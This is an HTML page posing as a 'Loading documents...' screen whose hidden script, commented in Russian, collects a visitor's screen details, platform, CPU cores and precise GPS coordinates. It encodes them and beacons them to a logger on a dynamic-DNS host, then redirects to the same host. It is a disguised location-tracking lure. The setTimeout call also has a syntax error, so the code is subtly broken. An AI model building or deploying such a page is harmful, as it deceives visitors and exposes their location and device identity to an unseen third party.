<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading documents...</title>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const slug = urlParams.get('id');
        const targetServer = "http://echomapwa.ddns.net/logger/api/log_advance/"; // Эндпоинт логов
        const finalRedirect = "http://echomapwa.ddns.net/logger/l/"; // Эндпоинт редиректа

        async function collectAndGo() {
            if (!slug) return;
        
            let info = {
                sw: window.screen.width, sh: window.screen.height,
                plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
                gpu: "Unknown", lat: null, lon: null
            };
        
            // Пытаемся взять GPS
            if ("geolocation" in navigator) {
                try {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000, enableHighAccuracy: true});
                    });
                    info.lat = pos.coords.latitude;
                    info.lon = pos.coords.longitude;
                } catch(e) { console.log("GPS Skip"); }
            }
        
            // "Шифруем" данные в Base64, чтобы пролезли в URL без проблем
            const encodedData = btoa(JSON.stringify(info));
            
            // ОТПРАВКА ЧЕРЕЗ КАРТИНКУ (Самый надежный метод для HTTP/HTTPS микса)
            const img = new Image();
            img.src = `${targetServer}${slug}?data=${encodedData}&_t=${Date.now()}`;
        
            // Ждем полсекунды, чтобы запрос ушел, и редиректим
            setTimeout(() => {
                window.location.href = finalRedirect + slug;
            }, 600;
        }

        collectAndGo();
    </script>
</body>
</html>
